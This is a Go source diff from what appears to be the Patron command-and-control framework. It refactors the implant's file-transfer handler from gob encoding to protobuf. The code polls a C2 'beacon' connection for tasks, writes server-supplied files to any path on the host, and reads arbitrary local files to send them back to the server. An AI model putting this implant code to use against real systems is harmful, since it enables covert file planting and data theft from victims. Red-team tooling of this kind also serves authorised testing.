@@ -1,162 +1,109 @@
 package client_utils
 
 import (
-	"crypto/tls"
-	"encoding/gob"
 	"fmt"
+	"io"
 	"os"
 	"path/filepath"
 
+	"github.com/PatronC2/Patron/Patronobuf/go/patronobuf"
+	"github.com/PatronC2/Patron/lib/common"
 	"github.com/PatronC2/Patron/lib/logger"
-	"github.com/PatronC2/Patron/types"
 )
 
-func HandleFileRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID string) error {
+func HandleFileRequest(beacon io.ReadWriteCloser, agentID string) error {
 	logger.Logf(logger.Info, "Sending file request")
 
 	for {
-		if err := SendRequest(encoder, types.FileRequestType, types.FileRequest{AgentID: agentID}); err != nil {
-			return err
+		req := &patronobuf.Request{
+			Type: patronobuf.RequestType_FILE,
+			Payload: &patronobuf.Request_File{
+				File: &patronobuf.FileRequest{
+					Uuid: agentID,
+				},
+			},
 		}
-		var response types.Response
-		var success = "Error"
-		if err := decoder.Decode(&response); err != nil {
-			return fmt.Errorf("error decoding file response: %v", err)
+		if err := common.WriteDelimited(beacon, req); err != nil {
+			return fmt.Errorf("send file request: %w", err)
 		}
-		if response.Type == types.FileResponseType {
-			if fileResponse, ok := response.Payload.(types.FileResponse); ok {
-				logger.Logf(logger.Info, "Recieved File Response Type: FileID: %v AgentID: %v Type: %v", fileResponse.FileID, fileResponse.AgentID, fileResponse.Type)
-				if fileResponse.Type == "Download" {
-					logger.Logf(logger.Info, "Downloading file to %v", fileResponse.Path)
-					err := downloadHandler(fileResponse)
-					if err != nil {
-						_ = fileTransferSuccessHandler(fileResponse.FileID, fileResponse.AgentID, fileResponse.Type, success, encoder, decoder)
-						return fmt.Errorf("failed to download file , %s", err)
-					}
-					success = "Success"
-					err = fileTransferSuccessHandler(fileResponse.FileID, fileResponse.AgentID, fileResponse.Type, success, encoder, decoder)
-					if err != nil {
-						logger.Logf(logger.Error, "Error sending file transfer success: %v", err)
-					}
 
-				} else if fileResponse.Type == "Upload" {
-					logger.Logf(logger.Info, "Uploading %v to server", fileResponse.Path)
-					err := uploadHandler(fileResponse, encoder, decoder)
-					if err != nil {
-						_ = fileTransferSuccessHandler(fileResponse.FileID, fileResponse.AgentID, fileResponse.Type, success, encoder, decoder)
-						return fmt.Errorf("failed to send file , %s", err)
-					}
-				} else {
-					logger.Logf(logger.Info, "No more files to process")
-					goto Exit
-				}
-			} else {
-				return fmt.Errorf("unexpected payload type for FileResponse")
+		resp := &patronobuf.Response{}
+		if err := common.ReadDelimited(beacon, resp); err != nil {
+			return fmt.Errorf("read file response: %w", err)
+		}
+		fileResp := resp.GetFileResponse()
+		if fileResp == nil || fileResp.GetTransfertype() == "" {
+			logger.Logf(logger.Info, "No more files to process")
+			return nil
+		}
+
+		logger.Logf(logger.Info, "Received file response: FileID=%v, Type=%v", fileResp.GetFileid(), fileResp.GetTransfertype())
+
+		if fileResp.GetTransfertype() == "Download" {
+			if err := handleFileDownload(fileResp); err != nil {
+				_ = sendFileStatus(beacon, fileResp, "Error")
+				return err
 			}
-		} else {
-			return fmt.Errorf("unexpected response type: %v, expected FileResponseType", response.Type)
+			_ = sendFileStatus(beacon, fileResp, "Success")
+		} else if fileResp.GetTransfertype() == "Upload" {
+			if err := handleFileUpload(beacon, fileResp); err != nil {
+				_ = sendFileStatus(beacon, fileResp, "Error")
+				return err
+			}
 		}
 	}
-Exit:
-	return nil
 }
 
-func downloadHandler(fileData types.FileResponse) error {
-	dir := filepath.Dir(fileData.Path)
+func handleFileDownload(file *patronobuf.FileResponse) error {
+	dir := filepath.Dir(file.GetFilepath())
 	if err := os.MkdirAll(dir, os.ModePerm); err != nil {
-		return fmt.Errorf("failed to create directory %s: %v", dir, err)
-	}
-
-	file, err := os.Create(fileData.Path)
-	if err != nil {
-		return fmt.Errorf("failed to create file %s: %v", fileData.Path, err)
-	}
-	defer file.Close()
-
-	_, err = file.Write(fileData.Chunk)
-	if err != nil {
-		return fmt.Errorf("failed to write data to file %s: %v", fileData.Path, err)
-	}
-	logger.Logf(logger.Info, "Successfully downloaded file to %s", fileData.Path)
-	return nil
-}
-
-func uploadHandler(fileResponse types.FileResponse, encoder *gob.Encoder, decoder *gob.Decoder) error {
-	filePath := fileResponse.Path
-	file, err := os.Open(filePath)
-	if err != nil {
-		return fmt.Errorf("failed to open file for upload: %v", err)
-	}
-	defer file.Close()
-
-	fileInfo, err := file.Stat()
-	if err != nil {
-		return fmt.Errorf("failed to get file info: %v", err)
-	}
-
-	fileSize := fileInfo.Size()
-	chunk := make([]byte, fileSize)
-	_, err = file.Read(chunk)
-	if err != nil {
-		return fmt.Errorf("failed to read file contents: %v", err)
-	}
-
-	fileReq := createFileToServerRequest(fileResponse.FileID, fileResponse.AgentID, fileResponse.Type, "Success", chunk)
-
-	if err := SendRequest(encoder, types.FileToServerType, fileReq); err != nil {
-		return fmt.Errorf("error sending file to server: %v", err)
-	}
-
-	var response types.Response
-	if err := decoder.Decode(&response); err != nil {
-		return fmt.Errorf("error decoding file transfer status response: %v", err)
-	}
-
-	if response.Type == types.FileTransferStatusResponseType {
-		if configResponse, ok := response.Payload.(types.FileTransferStatusResponse); ok {
-			logger.Logf(logger.Info, "Completed a file transfer: %v", configResponse)
-		}
-	} else {
-		return fmt.Errorf("unexpected response type: %v", response.Type)
-	}
-	return nil
-}
-
-func createFileToServerRequest(fileID string, agentID string, transferType string, status string, chunk []byte) types.FileToServer {
-	return types.FileToServer{
-		FileID:  fileID,
-		AgentID: agentID,
-		Type:    transferType,
-		Status:  status,
-		Chunk:   chunk,
-	}
-}
-
-func fileTransferSuccessHandler(fileID string, agentID string, transferType string, success string, encoder *gob.Encoder, decoder *gob.Decoder) error {
-	successReq := createSuccessRequest(fileID, agentID, transferType, success)
-	if err := SendRequest(encoder, types.FileToServerType, successReq); err != nil {
-		return err
-	}
-	var response types.Response
-	if err := decoder.Decode(&response); err != nil {
 		return err
 	}
 
-	if response.Type == types.FileTransferStatusResponseType {
-		if configResponse, ok := response.Payload.(types.FileTransferStatusResponse); ok {
-			logger.Logf(logger.Info, "Completed a file transfer: %v", configResponse)
-		}
-	} else {
-		return fmt.Errorf("unexpected response type: %v", response.Type)
+	f, err := os.Create(file.GetFilepath())
+	if err != nil {
+		return err
 	}
-	return nil
+	defer f.Close()
+
+	_, err = f.Write(file.GetChunk())
+	return err
 }
 
-func createSuccessRequest(fileID string, agentID string, transferType string, success string) types.FileToServer {
-	return types.FileToServer{
-		FileID:  fileID,
-		AgentID: agentID,
-		Type:    transferType,
-		Status:  success,
+func handleFileUpload(beacon io.ReadWriteCloser, file *patronobuf.FileResponse) error {
+	data, err := os.ReadFile(file.GetFilepath())
+	if err != nil {
+		return err
 	}
+
+	req := &patronobuf.Request{
+		Type: patronobuf.RequestType_FILE_TO_SERVER,
+		Payload: &patronobuf.Request_FileToServer{
+			FileToServer: &patronobuf.FileToServer{
+				Fileid:       file.GetFileid(),
+				Uuid:         file.GetUuid(),
+				Transfertype: file.GetTransfertype(),
+				Path:         file.GetFilepath(),
+				Status:       "Success",
+				Chunk:        data,
+			},
+		},
+	}
+	return common.WriteDelimited(beacon, req)
+}
+
+func sendFileStatus(beacon io.ReadWriteCloser, file *patronobuf.FileResponse, status string) error {
+	statusReq := &patronobuf.Request{
+		Type: patronobuf.RequestType_FILE_TO_SERVER,
+		Payload: &patronobuf.Request_FileToServer{
+			FileToServer: &patronobuf.FileToServer{
+				Fileid:       file.GetFileid(),
+				Uuid:         file.GetUuid(),
+				Transfertype: file.GetTransfertype(),
+				Path:         file.GetFilepath(),
+				Status:       status,
+			},
+		},
+	}
+	return common.WriteDelimited(beacon, statusReq)
 }
